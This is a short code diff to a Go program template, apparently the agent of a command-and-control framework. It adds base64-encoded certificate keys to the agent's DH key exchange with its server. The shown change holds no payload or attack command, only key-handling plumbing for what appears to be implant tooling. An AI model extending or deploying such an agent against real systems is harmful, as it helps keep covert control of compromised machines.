@@ -105,6 +105,28 @@ func main() {
 	lostLimit := {{ LOST_LIMIT }}
     stagingKeyBase64 := "{{ STAGING_KEY | safe }}"
 	defaultResponse := "{{ DEFAULT_RESPONSE }}"
+	agent_private_cert_key_encoded := "{{ AGENT_PRIVATE_CERT_KEY }}"
+	agent_public_cert_key_encoded := "{{ AGENT_PUBLIC_CERT_KEY }}"
+	server_public_cert_key_encoded := "{{ SERVER_PUBLIC_CERT_KEY }}"
+
+	agent_private_cert_key, err := base64.StdEncoding.DecodeString(agent_private_cert_key_encoded)
+
+	if err != nil {
+	 	fmt.Println("Error decoding agent private cert key:", err)
+		return
+	}
+
+	agent_public_cert_key, err := base64.StdEncoding.DecodeString(agent_public_cert_key_encoded)
+	if err != nil {
+		fmt.Println("Error decoding agent public cert key:", err)
+		return
+	}
+
+	server_public_cert_key, err := base64.StdEncoding.DecodeString(server_public_cert_key_encoded)
+	if err != nil {
+		fmt.Println("Error decoding server public cert key:", err)
+		return
+	}
 
 	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
 	if err != nil {
@@ -112,7 +134,7 @@ func main() {
 		return
 	}
 
-	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, sessionID, stagingKey)
+	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
 	if err != nil {
 		fmt.Println("Error performing DH key exchange:", err)
 		return
